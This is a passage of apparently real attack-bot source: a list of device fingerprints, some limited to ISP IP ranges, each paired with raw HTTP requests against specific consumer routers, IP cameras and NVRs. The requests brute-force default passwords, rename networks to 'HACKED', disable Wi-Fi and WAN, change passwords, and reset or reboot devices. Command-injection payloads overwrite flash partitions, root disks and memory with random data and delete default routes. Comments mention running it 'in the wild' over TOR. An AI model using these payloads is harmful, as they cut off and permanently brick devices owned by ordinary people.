    'POST /Forms/home_wan_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nHiddenFlag=0&wan_VC=PVC0&wanVCFlag=0&Alwan_VPI=0&Alwan_VCI=35&Alwan_QoS=nrtVBR&wan_PCR=0&wan_SCR=0&wan_MBS=0&wanIPVersionRadio=1&wanConTypeFlag=0&wanTypeRadio=Three&wan_IPv6DSLiteEnable=0&wan_IPv6DSLiteMode=0&wan_RemoteAddress=%3A%3A&wan_BridgeSelect=2684+Bridged+IP+LLC&BridgeFlag=0&wanIGMPQitFlag=0&wan_PVCO_Flag=0&PageLockValue=0',
    'POST /Forms/adv_adsl_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nModulationType=G.Lite&AnnexTypeA=ANNEX+M&adsl_opmode_apply=SAVE',    
    'POST /Forms/adv_adsl_1 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nModulationType=G.Lite&AnnexTypeA=ANNEX+M&adsl_opmode_apply=SAVE',    
    'GET / HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n',
  ],

	# this does not work reliably, maybe some kind of keepalive problem? Just resets 
	# sequence after login.. maybe IP change related with TOR? Perhaps just try in 
	# the wild and see what happens
	[ 'pldtmydsl', '^(49\.14[456789]|49\.15[01]|58\.69|112\.20[0-9]|112\.21[01]|119\.9[2345]|122\.[23]|122\.5[2345]|124\.10[4567])\.\d+\.\d+%%%.*200 Ok.*Server: microhttpd.*no-cache.*/index.html',
		'POST /login/login-page.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nAuthName=admin&AuthPassword=1234',
		'GET /index.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSION=%%CUSTOM1%%\r\nReferer: http://%%TARGETIP%%/login/login-page.cgi\r\n\r\n',
		'POST /pages/tabFW/wireless-general.wl HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: tabJson=..%2Fnetwork%2Fwireless%2Ftab.json; tabIndex=0; SESSION=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsessionKey=%%CUSTOM1%%&wlSyncNvram=1&wlDevice=0&wlHide=0&wlAPIsolation=0&wlBssidIsolation=0&wlEnableWmf=0&wlEnableButtom=0&wlExWpa=&wlSsidIdx=0&wlSsid=HACKED&wlAuthMode=psk+psk2&wlWep=disabled&wlAuth=0&wlUseDefaultWpaKey=0&wlWepPassphraseKey=&wlWpaPassphraseKey=&wlEmailEnable=0&wlSelectEmailSend=&wlSendEmailTo=&wlSendEmailTitle=&wlObssCoex=1&wlBand=2&wlEnbl=0&wlChannel=0&wlNBwCap=1&wlNCtrlsb=1&wlPassphraseUI=0&wlSsid_PLDT=HACKED&wlMaxAssoc=64&wlMaxBandwidth=&wlMaxDownBandwidth=&WireLess_EmailSelect=&WireLessSendEmailTitle=&WireLessSendEmailTo=&wlWpa=tkip%2Baes&wlWpaGtkRekey=1800',
		'GET /pages/tabFW/wireless-generalrefresh.wl?wlRefresh=0 HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: tabJson=..%2Fnetwork%2Fwireless%2Ftab.json; tabIndex=0; SESSION=%%CUSTOM1%%\r\n\r\n',
		'POST /login/login-page.cgi HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nAuthName=%%LOGIN%%&AuthPassword=%%PASSWORD%%',
		'POST /pages/connectionStatus/connectionStatus-SetpppDown.cgi?intfName=ppp1&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSION=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
	],

	[ 'pldtfibr', '302 Redirect.*GoAhead-Webs.*PeerSec-MatrixSSL.*1.1/login.html',
		'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=adminpldt\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=adminpldt&Passwd=0123456789',
		'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=adminpldt\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=adminpldt&Passwd=1234567890',
		'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=admin&Passwd=1234',
		'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=admin&Passwd=admin',
		'POST /goform/wirelessBasic HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nradiohiddenButton=2&radio_on=0&wirelessmode=4&select_regDomain=3&Fre_band=2&sz11aChannel=0&guard_inter=0',
		'POST /goform/setAccountSelfPwd HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\naccountSelf_user=%%LOGIN%%&accountSelf_oldPwd=%%PASSWORD%%&accountSelf_newname=&accountSelf_newPwd=%%NEWPASSWORD%%&accountSelf_newPwd2=%%NEWPASSWORD%%',
		'POST /goform/webLogin HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=adminpldt\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUser=adminpldt&Passwd=%%NEWPASSWORD%%',
		'POST /goform/APSecurity HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nssidIndex=1&SSIDEnable=disable&bssid_num=1&ssidName=HACKED&secure_WMM=1&security_mode=WPAPSKWPA2PSK&security_shared_mode=WEP&wep_default_key=1&WEP1=&WEP1Select=1&WEP2=&WEP2Select=1&WEP3=&WEP3Select=1&WEP4=&WEP4Select=1&cipher=2&passphrase=DefaultPasswordsSuck&PreAuthentication=1&RadiusServerIP=&RadiusServerPort=&RadiusServerSecret=&RadiusServerSessionTimeout=&RadiusServerIdleTimeout=&access_mode=0&addmac=',
		'POST /goform/setLan HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nhostname=&lanIp=10.%%RAND8%%&lanNetmask=255.255.255.0&ipv6_static_addr=fe80%3A%3A1%2F64&other_Flag=1&max_Interval=100&min_Interval=30&dns_srouce=0&Pridns_Set=&secdns_Set=&Prefix_Mode=0&Prefix_Set=&enable_dhcp6s=1&v6dhcpstart=0%3A0%3A0%3A2&v6dhcpend=0%3A0%3A0%3A255',
		# some weirdness here, device won't save the new wifi settings if we reboot immediately after
		# setting them.. so do some useless extra actions
		'POST /goform/wirelessGetSecurity HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n:""',
		'POST /goform/APSecurity HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nssidIndex=1&SSIDEnable=disable&bssid_num=1&ssidName=HACKED&secure_WMM=1&security_mode=WPAPSKWPA2PSK&security_shared_mode=WEP&wep_default_key=1&WEP1=&WEP1Select=1&WEP2=&WEP2Select=1&WEP3=&WEP3Select=1&WEP4=&WEP4Select=1&cipher=2&passphrase=DefaultPasswordsSuck&PreAuthentication=1&RadiusServerIP=&RadiusServerPort=&RadiusServerSecret=&RadiusServerSessionTimeout=&RadiusServerIdleTimeout=&access_mode=0&addmac=',
		'GET /lang/en/wireless.xml HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\n\r\n',
		'GET /management/account_self_admin.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\n\r\n',
		# lastly try to disconnect device, and if not successful then just reboot
		'POST /goform/WanCfg HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nwan_enable=0&wan_connectionmode=100&wan_connectionType=0&wan_vid=1030&wan_priority=0&nat_enable=0&dns_enable=0&wan_mtu=1500&wan_feBox=1&wan_ssidBox=1&wan_ssidBox=4&ipv6_enable=0&ipModel=0&AFTR_value=&staticIp=&staticNetmask=&staticGateway=&staticPriDns=&staticSecDns=&staticIp_ipv6=&Prefix_Length=&IPv6_Gateway=&IPv6_Pri_DNS=&IPv6_Sec_DNS=&Address%2FPrefix_static=2&Prefix_static=2&IPv6_prefix=&Address%2FPrefix_dhcp=0&Prefix_dhcp=0&pppoeUser=&pppoePass=&pppoeOPMode=0&pppoeRetryPeriod=&Address%2FPrefix_pppoe=1&Prefix_pppoe=0&wApply=Apply&fw_curIndex=0',
		'POST /goform/reboot HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: loginName=%%LOGIN%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\n:""',
    'GET / HTTP/1.0\r\n\r\n',
	],

  # Older Foscams.. silly payload but since there are a few API changes we might as well just push
  # two sets of commands with two sets of default passwords
  [ 'foscamold', 'Server: Netwave IP Camera',
  	'GET /camera_control.cgi?param=1&user=admin&pwd=&value=0 HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /camera_control.cgi?param=2&user=admin&pwd=&value=0 HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /camera_control.cgi?param=5&user=admin&pwd=&value=3 HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /set_network.cgi?next_url=rebootme.htm&user=admin&pwd=&ip=10.%%RAND8%%&mask=255.255.255.0&gateway=10.%%COMP8%%&dns=1.2.3.4&port=%%RANDPORT%% HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /set_wifi.cgi?next_url=rebootme.htm&channel=5&user=admin&pwd=admin&enable=0&ssid=&mode=0&encrypt=0&authtype=0&keyformat=0&defkey=0&key1=&key2=&key3=&key4=&key1_bits=0&key2_bits=0&key3_bits=0&key4_bits=0&wpa_psk= HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /set_pppoe.cgi?next_url=rebootme.htm&enable=0&user=admin&pwd= HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /reboot.cgi?next_url=reboot.htm&user=admin&pwd= HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
  	'GET /restore_factory.cgi?next_url=reboot.htm&user=admin&pwd= HTTP/1.0\r\nAuthorization: Basic YWRtaW46\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],
  
  # Telkom DSLs with support default logins
  [ 'telkomdlink', '^(105\.18[4567]|105\.22[456789])\.\d+\.\d+%%%.*Server: microhttpd.*Set-Cookie: Name=;',
  	'POST /index.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nusername=support&password=TelkomDlink12345&validateCode=',
		# test fetch some stuff to get modem to accept login
  	'GET /internet.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\n\r\n',
  	# disable wifi, first get sessionKey
  	'GET /wlcfg.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\nReferer: http://%%TARGETIP%%/internet.html\r\n\r\n',
  	'GET /wlcfg.wl?wlSsidIdx=0&wlEnbl=0&wlHide=0&wlAPIsolation=0&wlSsid=TELKOMHACKED&wlCountry=ZA&wlEnbl_wl0v1=0&wlEnbl_wl0v2=0&wlEnbl_wl0v3=0&wsc_config_state=1&wlSyncNvram=1&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\n\r\n',
    # disable PPP, get sessionKey
    'GET /setup_wancfg.html HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\n\r\n',
    'GET /dlwancfg.cmd?action=remove&rmLst=ppp0.1&sessionKey=%%CUSTOM1%% HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: Name=\r\n\r\n',
    'GET / HTTP/1.0\r\n\r\n',
  ],
  # Aztech (Telkom and Bayan, maybe others?) router web interface admin/admin
  [ 'aztechweb', 'K;Content-type: text/html;charset=ISO-8859-1.*domtabadv\.css',
  	'GET /cgi-bin/login.cgi?username=admin&password=admin HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n', 
  	'GET /cgi-bin/login.cgi?username=admin&password=bayandsl HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n', 
  	'GET /cgi-bin/login.cgi?username=admin&password=epicrouter HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n', 
  	'GET /cgi-bin/login.cgi?username=admin&password=password HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n', 
  	'GET /cgi-bin/login.cgi?username=admin&password= HTTP/1.1\r\nHost: %%TARGETIP%%\r\n\r\n', 
  	'POST /cgi-bin/netLan.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSIONID=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsaveFlag=1&lan_VC=0&lan_Alias_VC=0&aliasFlag=No&defaultRoute=0&defaultRoute_isp=2&staticNum=0&delnum=&tmpStartIp=10.0.0.3&tmpPoolCount=252&option60Flag=No&isIPv6Supported=0&ipv6Flag=0&lan2Wan=No&dhcpethdis=No&dhcpethen=Yes&uiViewIPAddr=10.%%RAND8%%&dhcpFlag=0&lanFlag=0&DNSproxy=Yes&uiViewNetMask=255.255.255.0&dhcpTypeRadio=1&StartIp=10.0.0.3&PoolSize=252&dhcp_LeaseTime=86400&dnsTypeRadio=0',
  	'POST /cgi-bin/wlBasic.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSIONID=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsaveFlag=1&N_wlan_APenable=0&BasicRate_Value1=15&BasicRate_Value2=3&BasicRate_Value3=351&CountryRegion0=0&CountryRegion1=1&CountryRegion2=2&CountryRegion3=3&CountryRegion5=5&CountryRegion6=6&HTMCSAUTO=33&HTBW=0&WPSConfigured=2&WpsConfModeAll=7&WpsConfModeNone=0&Is11nMode=1&ExtChannFlag=0&isInWPSing=0&CountryName=SOUTH+AFRICA&BssidNum=1&WpsStart=0&WpsOOB=0&BUTTON=SAVE&wlanWEPFlag=3&ESSID=HACKED&bssid_num=1&ESSID_HIDE_Selection=0&WirelessMode=9&BeaconInterval=100&DTIM=1&FragmentThreshold=2346&RTSThreshold=2347&Countries_Channels=SOUTH+AFRICA&Channel_ID=6&WLANChannelBandwidth=1&WLANGuardInterval=1&WLANMCS=33&WLANExtensionChannel=0&CountryChange=0',
  	'POST /cgi-bin/quickstart.asp HTTP/1.1\r\nHost: %%TARGETIP%%\r\nCookie: SESSIONID=%%CUSTOM1%%\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\npage=home.asp&saveFlag=1&wanVCFlag=&vEnable=0&vSSID=0&timeType=0&AuthMode=WPAPSKWPA2PSK&TKIP_Selection=TKIPAES&TypeFlag=2&commit=1&select=PPPoE+LLC&wan_VCStatus=Yes&ATM_QoS=ubr&ATM_PCR=0&ATM_SCR=0&ATM_MBS=0&wan_NAT=Enable&wan_DefaultRoute=Yes&wan_TCPMTU=0&wan_RIPVersion=RIP1&wan_RIPDirection=None&wan_IGMP=Disabled&wan_ConnectSelect=Connect_Keep_Alive&wan_IdleTimeT=&wan_TCPMSS=0&wan_PPPGetIP=Dynamic&wan_StaticIPaddr=&wan_StaticIPSubMask=&wan_StaticIpGateway=&N_linktype=eth0.4&N_macEnbl=0&N_clonemac=N%2FA&ftthPVC=7&ftthDefRoute=No&wan7ifname=eth0.4&wan_VC=0&wan7Active=Yes&lan2Wan=Yes&dhcpethdis=No&lan_VC=0&dhcpTypeRadio=1&uiViewdateTZ=GMT%2B03%3A00&uiViewSNTPServer=igubu.saix.net&Custom_NTP_Server=igubu.saix.net&daylight=Disable&wan_connType=WAN&3g_apnMeth=list&3g_countryList=0&3g_opList=0&3g_apnList=0&3g_apn=&3g_authType=0&netType=AUTO&3g_connMethod=1&3g_idleTimeout=N%2FA&3g_umtsdialnumber=*99%23&3g_umtsusername=&3g_umtspassword=&3g_umtscpin=&conn_type=1&uiViewUserNameMark=guest%40telkomadsl&uiViewPasswordMark=guest&wzStatic_IPaddr=&wzStatic_SubMask=&wzStatic_GatewayAdd=&dns1=&dns2=&wzDHCP_VPI=8&wzDHCP_VCI=35&ESSID_HIDE_Selection=on&wireless_ssid=HACKED&wpaenable=on&PreSharedKey=802325481036364884',
    'GET / HTTP/1.0\r\n\r\n',
  ],

	[ 'netgeardgn1022', '(NETGEAR DGN1000|NETGEAR DGN2200)', 
		'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=cat+/dev/urandom+>/dev/root&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',
		'GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=route+del+default&curpath=/&currentsetting.htm=1 HTTP/1.0\r\n\r\n',
		'GET / HTTP/1.0\r\n\r\n',
	],
	
	# NOTE: this seems to mainly be SSL port 8443 ? So probably useless sploit here
	[ 'netgearr7064', '(NETGEAR R7000|NETGEAR R6400)', 
		'GET /cgi-bin/;cat$IFS/dev/urandom$IFS>/dev/root HTTP/1.0\r\n\r\n',
		'GET /cgi-bin/;route$IFSdel$IFSdefault HTTP/1.0\r\n\r\n',
		'GET / HTTP/1.0\r\n\r\n',
	],
	
	# VACRON NVR
	[ 'vacron', '(VACRON NVR|Boa.*title>DVR LOGIN<\/ti)', 
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock0 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock9 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock10 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/sda1 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock1 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock2 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock3 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock4 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock5 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock6 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock7 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/mtdblock8 HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=cat%20/dev/urandom%20>/dev/root HTTP/1.0\r\n\r\n',
		'GET /board.cgi?cmd=route%20del%20default HTTP/1.0\r\n\r\n',
		'GET / HTTP/1.0\r\n\r\n',
	],
	
	# JAWS (weird behaviors w some units)
	[ 'jaws', 'Server: JAWS',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/sda1 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/sda2 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock0 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock1 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock2 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock3 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock4 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock5 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock0 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock1 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock2 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock3 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock4 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mtdblock5 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%220%22%20squ=%22abcdefg%22%20dir=%220%22%20enc=%221%22%3E%3Cenvload%20type=%221%22%20usr=%22admin%22%20pwd=%22%22%3E%3Cscreen%20chn=%220%22%20title=%22HACKED%22/%3E%3Ccopyg%20chn=%220%22%20type=%225%22%20channels=%22255%22/%3E%3C/envload%3E%3C/juan%3E&_=1510387268908 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\nCookie: dvr_camcnt=8; dvr_clientport=80; dvr_sensorcnt=4; lxc_save=admin%2C; dvr_usr=admin; dvr_pwd=null; iSetAble=1; iPlayBack=1\r\n\r\n',
		'GET /cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%220%22%20squ=%22abcdefg%22%20dir=%220%22%20enc=%221%22%3E%3Cenvload%20type=%221%22%20usr=%22admin%22%20pwd=%22%22%3E%3Cnetwork%20ip=%2210.%%RAND8%%%22%20gateway=%2210.%%COMP8%%%22%20dns=%2210.%%COMP8%%%22%20enetid=%2221391293%22%20pppoe=%221%22%20pppoeusr=%22HACKED%22%20pppoepwd=%22HACKED%22/%3E%3C/envload%3E%3C/juan%3E&_=1510387452140 HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\nCookie: dvr_camcnt=8; dvr_clientport=80; dvr_sensorcnt=4; lxc_save=admin%2C; dvr_usr=admin; dvr_pwd=null; iSetAble=1; iPlayBack=1\r\n\r\n',
		'GET /shell?route%20del%20default HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET /shell?cat%20/dev/urandom%20%3E/dev/mem HTTP/1.1\r\nHost:%%TARGETIP%%:%%TARGETPORT\r\n\r\n',
		'GET / HTTP/1.0\r\n\r\n',
	],
	
	# ReadyNAS placeholder (fill in when we find one!)
	[ 'readynas', 'Apache.*Debian.*Location:\shttp:\S+/admin;Vary',
		'GET / HTTP/1.0\r\n\r\n',
	],

	# Alt to user.cgi/mtk.cgi models, ajax.cgi
	[ 'mediatekajax', 'Server: lighttpd/1.*style\.css.*ion\sinit\(\).*ion\sfFOB\(o\).*',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=admin',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=admin123',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=admin1234',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=admin&UI_ADMIN_PASSWORD=password',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=user&UI_ADMIN_PASSWORD=user',
		'POST /ajax.cgi?action=login HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nUI_ADMIN_USERNAME=guest&UI_ADMIN_PASSWORD=guest',
		# first reconfig some stuff
		'POST /ajax.cgi?action=net_dhcp HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsid=%%CUSTOM1%%&DHCPD_STATIC_LEASE=&DHCPD_ENABLE=0&DHCPD_START_IP_01=10&DHCPD_START_IP_02=1&DHCPD_START_IP_03=1&DHCPD_START_IP_04=1&DHCPD_START_IP=&DHCPD_END_IP_01=10&DHCPD_END_IP_02=1&DHCPD_END_IP_03=1&DHCPD_END_IP_04=100&DHCPD_END_IP=&DNS_IP_1=&DNS_IP_2=&DNS_IP_3=&DHCPD_LEASE_TIME=1440&btnSubmit=1&DHCPD_DNS=&ippt_enable=0&IPPT_EXCEPTION=1%2CY%2C1%2C1%2C68%2C67%2CDHCP+request+from+lan%3B2%2CY%2C2%2C1%2C67%2C68%2CDHCP+response+from+wan%3B&IPPT_EXCEPTION_NUM=2',
		'POST /ajax.cgi?action=net_lan HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsid=%%CUSTOM1%%&LAN_IP_01=10&LAN_IP_02=%%RAND81%%&LAN_IP_03=%%RAND82%%&LAN_IP_04=%%RAND83%%&LAN_IP=10.%%RAND8%%&LAN_MASK_01=255&LAN_MASK_02=255&LAN_MASK_03=255&LAN_MASK_04=254&LAN_MASK=255.255.255.254&btnSubmit=1',
		'POST /ajax.cgi?action=net_bridge_nat_mode HTTP/1.0\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %%BODYLENGTH%%\r\n\r\nsid=%%CUSTOM1%%&LAN_IP_01=10&LAN_IP_02=%%RAND81%%&LAN_IP_03=%%RAND82%%&LAN_IP_04=%%RAND83%%&LAN_IP=10.%%RAND8%%&LAN_MASK_01=255&LAN_MASK_02=255&LAN_MASK_03=255&LAN_MASK_04=254&LAN_MASK=255.255.255.254&LAN_MTU=1500&WAN_OP_MODE=0&WAN_TYPE=0&WAN_IP=&WAN_MASK=&WAN_GATEWAY=&WAN_MTU=1400&dns_type_1=1&DNS_IP_1_01=0&DNS_IP_1_02=0&DNS_IP_1_03=0&DNS_IP_1_04=0&DNS_IP_1=&dns_type_2=1&DNS_IP_2_01=0&DNS_IP_2_02=0&DNS_IP_2_03=0&DNS_IP_2_04=0&DNS_IP_2=&dns_type_3=1&DNS_IP_3_01=0&DNS_IP_3_02=0&DNS_IP_3_03=0&DNS_IP_3_04=0&DNS_IP_3=&btnSubmit=1&WAN_DNS=1%2C0.0.0.0+1%2C0.0.0.0+1%2C0.0.0.0', 
		# RCA time - first SNMP payload
